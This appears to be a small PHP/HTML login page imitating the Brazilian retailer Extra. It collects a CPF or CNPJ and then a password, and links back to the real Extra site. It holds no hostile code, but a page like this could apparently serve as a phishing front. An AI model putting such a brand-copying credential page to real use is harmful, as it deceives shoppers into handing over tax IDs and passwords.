<?php
$EoS = 0;
if(isset($_GET['login'])){
    $EoS = 1;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="CSS\style.css"> 
    <link rel="icon" type="image/png" href="IMG\logo.png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;700&display=swap" rel="stylesheet">
    <script src="JS\script.js"></script>
    <title>Extra | Identificação </title>
</head>
<body>
    <header>
        <nav>
            <img src="IMG/teste.png" alt="logo2">
        </nav>   
    </header>
    <nav id="nav">
        <a href="https://www.extra.com.br/" id="voltar"> < Voltar </a>
    </nav>
    <?php if($EoS != 1){?>
            <section>        
                <h2>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Identificação</h2>
                <div class="container">
                    <h1>Para continuar, preencha com o seu CPF ou CNPJ</h1>
                    <br>
                    <br>
                    <form action="ValidarEmail.php" method="post">
                        <label>CPF ou CNPJ</label>
                        <input placeholder="Insira o CPF ou CNPJ aqui" type="text" oninput="validarNumero(this)" name="login">
                        <br>
                        <br>
                        <button type="submit">Entrar</button>
                    </form>
                </div>
            </section>
        <?php }?>
        <?php if($EoS == 1){?>
            <section>        
                <h2>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Identificação</h2>
                <div class="container">
                    <h1>Para continuar, preencha com a sua Senha</h1>
                    <br>
                    <br>
                    <form action="Logado.php" method="post">
                        <label>Senha</label>
                        <input placeholder="Insira sua Senha" type="password" name="senha">
                        <br>
                        <button type="submit">Entrar</button>
                    </form>
                </div>
            </section>
    <?php }?>
</body>
</html>